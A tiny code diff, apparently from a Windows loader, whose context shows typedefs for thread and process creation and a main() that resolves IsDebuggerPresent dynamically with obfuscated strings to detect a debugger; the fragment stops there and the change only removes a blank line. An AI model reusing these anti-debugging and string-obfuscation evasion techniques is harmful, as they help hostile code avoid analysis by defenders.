@@ -25,7 +25,6 @@ typedef HANDLE(WINAPI* CreateThreadCustom)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHRE
 typedef BOOL(WINAPI* IsDebPresent)();
 typedef BOOL(WINAPI* CreateProcessCustom)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
 
-
 int main(int argc, char** argv) {
 	IsDebPresent isDebPresent = (IsDebPresent)GetProcAddress(GetModuleHandleA(skCrypt("kernel32.dll")), skCrypt("IsDebuggerPresent"));
 	if (isDebPresent()) {
